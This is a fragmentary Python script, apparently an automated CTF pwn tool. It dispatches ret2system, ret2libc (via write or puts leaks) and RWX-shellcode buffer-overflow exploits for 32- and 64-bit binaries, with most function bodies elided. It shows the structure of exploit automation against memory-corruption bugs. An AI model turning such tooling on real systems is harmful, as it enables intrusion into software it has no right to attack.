...
def ret2libc_write_x32(program,libc,padding):
	io = process(program)
	if libc == 1:
...
def ret2libc_write_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers):
	io = process(program)
	if libc == 1:
		print('[*]用户未指定libc地址 use LibcSearcherX')
	else:
...
def ret2libc_put_x32(program,libc,padding):
	io = process(program)
	if libc == 1:
		print('[*]用户未指定libc地址 use LibcSearcherX')
	else:
...
def ret2libc_put_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers):
	io = process(program)
	if libc == 1:
		print('[*]用户未指定libc地址 use LibcSearcherX')
	else:
...
if __name__ == '__main__':
	...
	if url and port:
		...
		if system == 1 and bin_sh == 1:
			if bit == 32:
				ret2_system_x32(program,libc,padding)
				sys.exit(0)
			if bit == 64:
				ret2_system_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr)
				sys.exit(0)

		if write == 1:
			if bit == 32:
				ret2libc_write_x32(program,libc,padding)
				sys.exit(0)
			if bit == 64:
				ret2libc_write_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers)
				sys.exit(0)

		if puts == 1:
			if bit ==32:
				ret2libc_put_x32(program,libc,padding)
				sys.exit(0)
			if bit ==64:
				ret2libc_put_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers)
				sys.exit(0)
		...
		if rwx == 1:
			...
			if bit == 64:
				function, buf_addr , function_name = find_large_bss_symbols(program)
				if function == 1:
					rwx_shellcode_x64(program, buf_addr, padding, function_name,ret_addr)
					sys.exit(0)
